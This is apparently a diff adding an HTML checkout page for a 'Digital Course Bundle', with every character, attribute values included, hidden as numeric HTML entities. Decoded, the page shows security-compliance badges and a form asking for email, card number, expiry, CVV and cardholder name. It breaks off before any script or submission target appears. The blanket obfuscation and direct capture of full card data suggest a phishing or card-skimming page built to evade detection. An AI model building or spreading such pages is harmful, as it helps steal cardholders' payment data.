+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span>&#69;&#110;&#115;&#117;&#114;&#101;&#115;&#32;&#116;&#104;&#97;&#116;&#32;&#100;&#105;&#115;&#112;&#117;&#116;&#101;&#115;&#32;&#97;&#114;&#101;&#32;&#104;&#97;&#110;&#100;&#108;&#101;&#100;&#32;&#100;&#105;&#108;&#105;&#103;&#101;&#110;&#116;&#108;&#121;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#109;&#116;&#45;&#52;&#32;&#112;&#120;&#45;&#54;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<h2 class="&#116;&#101;&#120;&#116;&#45;&#120;&#108;&#32;&#102;&#111;&#110;&#116;&#45;&#115;&#101;&#109;&#105;&#98;&#111;&#108;&#100;&#32;&#109;&#98;&#45;&#52;">&#80;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#68;&#101;&#115;&#99;&#114;&#105;&#112;&#116;&#105;&#111;&#110;</h2>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<p class="&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#54;&#48;&#48;&#32;&#109;&#98;&#45;&#52;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#80;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#102;&#111;&#114;&#32;&#68;&#105;&#103;&#105;&#116;&#97;&#108;&#32;&#67;&#111;&#117;&#114;&#115;&#101;&#32;&#66;&#117;&#110;&#100;&#108;&#101;&#32;&#226;&#128;&#147;&#32;&#80;&#114;&#101;&#109;&#105;&#117;&#109;&#32;&#97;&#99;&#99;&#101;&#115;&#115;&#32;&#116;&#111;&#32;&#111;&#117;&#114;&#32;&#99;&#111;&#109;&#112;&#108;&#101;&#116;&#101;&#32;&#100;&#105;&#103;&#105;&#116;&#97;&#108;&#32;&#108;&#101;&#97;&#114;&#110;&#105;&#110;&#103;&#32;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#32;&#105;&#110;&#99;&#108;&#117;&#100;&#105;&#110;&#103;&#32;&#97;&#108;&#108;&#32;&#99;&#111;&#117;&#114;&#115;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#114;&#101;&#115;&#111;&#117;&#114;&#99;&#101;&#115;&#46;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</p>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#98;&#103;&#45;&#98;&#108;&#117;&#101;&#45;&#53;&#48;&#32;&#112;&#45;&#52;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#50;&#120;&#108;&#32;&#109;&#98;&#45;&#52;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#102;&#108;&#101;&#120;&#32;&#105;&#116;&#101;&#109;&#115;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#103;&#97;&#112;&#45;&#50;&#32;&#116;&#101;&#120;&#116;&#45;&#98;&#108;&#117;&#101;&#45;&#55;&#48;&#48;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg class="&#119;&#45;&#53;&#32;&#104;&#45;&#53;" viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<path d="&#77;&#57;&#32;&#49;&#50;&#108;&#50;&#32;&#50;&#32;&#52;&#45;&#52;&#109;&#53;&#46;&#54;&#49;&#56;&#45;&#52;&#46;&#48;&#49;&#54;&#65;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#48;&#32;&#48;&#49;&#49;&#50;&#32;&#50;&#46;&#57;&#52;&#52;&#97;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#49;&#49;&#46;&#57;&#53;&#53;&#32;&#48;&#32;&#48;&#49;&#45;&#56;&#46;&#54;&#49;&#56;&#32;&#51;&#46;&#48;&#52;&#65;&#49;&#50;&#46;&#48;&#50;&#32;&#49;&#50;&#46;&#48;&#50;&#32;&#48;&#32;&#48;&#48;&#51;&#32;&#57;&#99;&#48;&#32;&#53;&#46;&#53;&#57;&#49;&#32;&#51;&#46;&#56;&#50;&#52;&#32;&#49;&#48;&#46;&#50;&#57;&#32;&#57;&#32;&#49;&#49;&#46;&#54;&#50;&#50;&#32;&#53;&#46;&#49;&#55;&#54;&#45;&#49;&#46;&#51;&#51;&#50;&#32;&#57;&#45;&#54;&#46;&#48;&#51;&#32;&#57;&#45;&#49;&#49;&#46;&#54;&#50;&#50;&#32;&#48;&#45;&#49;&#46;&#48;&#52;&#50;&#45;&#46;&#49;&#51;&#51;&#45;&#50;&#46;&#48;&#53;&#50;&#45;&#46;&#51;&#56;&#50;&#45;&#51;&#46;&#48;&#49;&#54;&#122;" />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</svg>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span class="&#116;&#101;&#120;&#116;&#45;&#115;&#109;">&#80;&#67;&#73;&#32;&#68;&#83;&#83;&#32;&#67;&#111;&#109;&#112;&#108;&#105;&#97;&#110;&#116;&#32;&#226;&#128;&#162;&#32;&#50;&#53;&#54;&#45;&#98;&#105;&#116;&#32;&#83;&#83;&#76;&#32;&#69;&#110;&#99;&#114;&#121;&#112;&#116;&#105;&#111;&#110;&#32;&#226;&#128;&#162;&#32;&#83;&#101;&#99;&#117;&#114;&#101;&#32;&#80;&#97;&#121;&#109;&#101;&#110;&#116;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#53;&#48;&#48;&#32;&#102;&#108;&#101;&#120;&#32;&#105;&#116;&#101;&#109;&#115;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#103;&#97;&#112;&#45;&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span>&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#32;&#102;&#101;&#101;&#32;&#105;&#115;&#32;&#50;&#37;&#32;&#111;&#102;&#32;&#116;&#104;&#101;&#32;&#116;&#114;&#97;&#110;&#115;&#97;&#99;&#116;&#105;&#111;&#110;&#32;&#97;&#109;&#111;&#117;&#110;&#116;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div id="&#105;&#110;&#118;&#111;&#105;&#99;&#101;&#73;&#100;&#67;&#111;&#110;&#116;&#97;&#105;&#110;&#101;&#114;" class="&#109;&#116;&#45;&#52;&#32;&#98;&#103;&#45;&#103;&#114;&#97;&#121;&#45;&#49;&#48;&#48;&#32;&#112;&#45;&#51;&#32;&#104;&#105;&#100;&#100;&#101;&#110;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span class="&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#102;&#111;&#110;&#116;&#45;&#109;&#101;&#100;&#105;&#117;&#109;">&#73;&#78;&#86;&#79;&#73;&#67;&#69;&#32;&#73;&#68;&#58;&#32;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span class="&#116;&#101;&#120;&#116;&#45;&#115;&#109;" id="&#105;&#110;&#118;&#111;&#105;&#99;&#101;&#73;&#100;"></span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#109;&#100;&#58;&#119;&#45;&#53;&#47;&#49;&#50;&#32;&#112;&#45;&#53;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div id="&#112;&#97;&#121;&#109;&#101;&#110;&#116;&#70;&#111;&#114;&#109;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#97;&#109;&#111;&#117;&#110;&#116;&#45;&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#32;&#109;&#98;&#45;&#54;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#65;&#109;&#111;&#117;&#110;&#116;&#32;&#116;&#111;&#32;&#80;&#97;&#121;&#58;&#32;&#226;&#130;&#185;<span id="&#100;&#105;&#115;&#112;&#108;&#97;&#121;&#65;&#109;&#111;&#117;&#110;&#116;">&#48;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<form id="&#109;&#97;&#105;&#110;&#70;&#111;&#114;&#109;" class="&#115;&#112;&#97;&#99;&#101;&#45;&#121;&#45;&#52;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#104;&#105;&#100;&#100;&#101;&#110;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="&#98;&#108;&#111;&#99;&#107;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#102;&#111;&#110;&#116;&#45;&#109;&#101;&#100;&#105;&#117;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#55;&#48;&#48;&#32;&#109;&#98;&#45;&#50;">&#65;&#109;&#111;&#117;&#110;&#116;&#32;&#40;&#73;&#78;&#82;&#41;</label>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#114;&#101;&#108;&#97;&#116;&#105;&#118;&#101;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span class="&#114;&#117;&#112;&#101;&#101;&#45;&#115;&#105;&#103;&#110;">&#226;&#130;&#185;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="&#116;&#101;&#120;&#116;" id="&#97;&#109;&#111;&#117;&#110;&#116;" class="&#98;&#108;&#111;&#99;&#107;&#32;&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#108;&#45;&#56;&#32;&#112;&#114;&#45;&#51;&#32;&#112;&#121;&#45;&#50;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#103;&#114;&#97;&#121;&#45;&#51;&#48;&#48;" readonly />&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="&#98;&#108;&#111;&#99;&#107;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#102;&#111;&#110;&#116;&#45;&#109;&#101;&#100;&#105;&#117;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#55;&#48;&#48;&#32;&#109;&#98;&#45;&#50;">&#69;&#109;&#97;&#105;&#108;</label>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="&#101;&#109;&#97;&#105;&#108;" id="&#101;&#109;&#97;&#105;&#108;" class="&#98;&#108;&#111;&#99;&#107;&#32;&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#120;&#45;&#51;&#32;&#112;&#121;&#45;&#50;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#103;&#114;&#97;&#121;&#45;&#51;&#48;&#48;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;" placeholder="&#121;&#111;&#117;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;" required>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="&#98;&#108;&#111;&#99;&#107;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#102;&#111;&#110;&#116;&#45;&#109;&#101;&#100;&#105;&#117;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#55;&#48;&#48;&#32;&#109;&#98;&#45;&#50;">&#67;&#97;&#114;&#100;&#32;&#78;&#117;&#109;&#98;&#101;&#114;</label>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#114;&#101;&#108;&#97;&#116;&#105;&#118;&#101;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="&#116;&#101;&#120;&#116;" id="&#99;&#97;&#114;&#100;&#78;&#117;&#109;&#98;&#101;&#114;" maxlength="&#49;&#57;" class="&#98;&#108;&#111;&#99;&#107;&#32;&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#120;&#45;&#51;&#32;&#112;&#121;&#45;&#50;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#103;&#114;&#97;&#121;&#45;&#51;&#48;&#48;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;&#32;&#112;&#114;&#45;&#49;&#50;" placeholder="&#52;&#50;&#52;&#50;&#32;&#52;&#50;&#52;&#50;&#32;&#52;&#50;&#52;&#50;&#32;&#52;&#50;&#52;&#50;" required>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#97;&#98;&#115;&#111;&#108;&#117;&#116;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#45;&#51;&#32;&#116;&#111;&#112;&#45;&#49;&#47;&#50;&#32;&#45;&#116;&#114;&#97;&#110;&#115;&#108;&#97;&#116;&#101;&#45;&#121;&#45;&#49;&#47;&#50;" id="&#99;&#97;&#114;&#100;&#84;&#121;&#112;&#101;&#73;&#99;&#111;&#110;"></div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<p id="&#99;&#97;&#114;&#100;&#69;&#114;&#114;&#111;&#114;" class="&#116;&#101;&#120;&#116;&#45;&#114;&#101;&#100;&#45;&#53;&#48;&#48;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#109;&#116;&#45;&#49;&#32;&#104;&#105;&#100;&#100;&#101;&#110;">&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#101;&#110;&#116;&#101;&#114;&#32;&#97;&#32;&#118;&#97;&#108;&#105;&#100;&#32;&#99;&#97;&#114;&#100;&#32;&#110;&#117;&#109;&#98;&#101;&#114;</p>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="&#103;&#114;&#105;&#100;&#32;&#103;&#114;&#105;&#100;&#45;&#99;&#111;&#108;&#115;&#45;&#50;&#32;&#103;&#97;&#112;&#45;&#52;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="&#98;&#108;&#111;&#99;&#107;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#102;&#111;&#110;&#116;&#45;&#109;&#101;&#100;&#105;&#117;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#55;&#48;&#48;&#32;&#109;&#98;&#45;&#50;">&#69;&#120;&#112;&#105;&#114;&#121;&#32;&#68;&#97;&#116;&#101;</label>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="&#116;&#101;&#120;&#116;" id="&#101;&#120;&#112;&#105;&#114;&#121;" maxlength="&#53;" class="&#98;&#108;&#111;&#99;&#107;&#32;&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#120;&#45;&#51;&#32;&#112;&#121;&#45;&#50;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#103;&#114;&#97;&#121;&#45;&#51;&#48;&#48;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;" placeholder="&#77;&#77;&#47;&#89;&#89;" required>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<p id="&#101;&#120;&#112;&#105;&#114;&#121;&#69;&#114;&#114;&#111;&#114;" class="&#116;&#101;&#120;&#116;&#45;&#114;&#101;&#100;&#45;&#53;&#48;&#48;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#109;&#116;&#45;&#49;&#32;&#104;&#105;&#100;&#100;&#101;&#110;">&#73;&#110;&#118;&#97;&#108;&#105;&#100;&#32;&#101;&#120;&#112;&#105;&#114;&#121;&#32;&#100;&#97;&#116;&#101;</p>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="&#98;&#108;&#111;&#99;&#107;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#102;&#111;&#110;&#116;&#45;&#109;&#101;&#100;&#105;&#117;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#55;&#48;&#48;&#32;&#109;&#98;&#45;&#50;">&#67;&#86;&#86;</label>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" id="&#99;&#118;&#118;" maxlength="&#51;" class="&#98;&#108;&#111;&#99;&#107;&#32;&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#120;&#45;&#51;&#32;&#112;&#121;&#45;&#50;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#103;&#114;&#97;&#121;&#45;&#51;&#48;&#48;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;" placeholder="&#49;&#50;&#51;" required>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="&#98;&#108;&#111;&#99;&#107;&#32;&#116;&#101;&#120;&#116;&#45;&#115;&#109;&#32;&#102;&#111;&#110;&#116;&#45;&#109;&#101;&#100;&#105;&#117;&#109;&#32;&#116;&#101;&#120;&#116;&#45;&#103;&#114;&#97;&#121;&#45;&#55;&#48;&#48;&#32;&#109;&#98;&#45;&#50;">&#67;&#97;&#114;&#100;&#104;&#111;&#108;&#100;&#101;&#114;&#32;&#78;&#97;&#109;&#101;</label>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="&#116;&#101;&#120;&#116;" id="&#99;&#97;&#114;&#100;&#104;&#111;&#108;&#100;&#101;&#114;&#78;&#97;&#109;&#101;" class="&#98;&#108;&#111;&#99;&#107;&#32;&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#120;&#45;&#51;&#32;&#112;&#121;&#45;&#50;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#32;&#98;&#111;&#114;&#100;&#101;&#114;&#45;&#103;&#114;&#97;&#121;&#45;&#51;&#48;&#48;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;" placeholder="&#74;&#111;&#104;&#110;&#32;&#68;&#111;&#101;" required>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#13;
+&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<button type="&#115;&#117;&#98;&#109;&#105;&#116;" id="&#115;&#117;&#98;&#109;&#105;&#116;&#66;&#117;&#116;&#116;&#111;&#110;" class="&#119;&#45;&#102;&#117;&#108;&#108;&#32;&#112;&#121;&#45;&#51;&#32;&#112;&#120;&#45;&#52;&#32;&#102;&#108;&#101;&#120;&#32;&#105;&#116;&#101;&#109;&#115;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#106;&#117;&#115;&#116;&#105;&#102;&#121;&#45;&#99;&#101;&#110;&#116;&#101;&#114;&#32;&#116;&#101;&#120;&#116;&#45;&#119;&#104;&#105;&#116;&#101;&#32;&#114;&#111;&#117;&#110;&#100;&#101;&#100;&#45;&#110;&#111;&#110;&#101;&#32;&#98;&#103;&#45;&#103;&#114;&#97;&#121;&#45;&#52;&#48;&#48;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<span id="&#115;&#117;&#98;&#109;&#105;&#116;&#84;&#101;&#120;&#116;">&#80;&#114;&#111;&#99;&#101;&#101;&#100;&#32;&#116;&#111;&#32;&#80;&#97;&#121;</span>&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div id="&#115;&#117;&#98;&#109;&#105;&#116;&#76;&#111;&#97;&#100;&#101;&#114;" class="&#119;&#45;&#53;&#32;&#104;&#45;&#53;&#32;&#97;&#110;&#105;&#109;&#97;&#116;&#101;&#45;&#115;&#112;&#105;&#110;&#32;&#104;&#105;&#100;&#100;&#101;&#110;&#32;&#109;&#108;&#45;&#50;">&#13;
+&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<svg viewBox="&#48;&#32;&#48;&#32;&#50;&#52;&#32;&#50;&#52;" fill="&#110;&#111;&#110;&#101;" stroke="&#99;&#117;&#114;&#114;&#101;&#110;&#116;&#67;&#111;&#108;&#111;&#114;" stroke-width="&#50;">&#13;
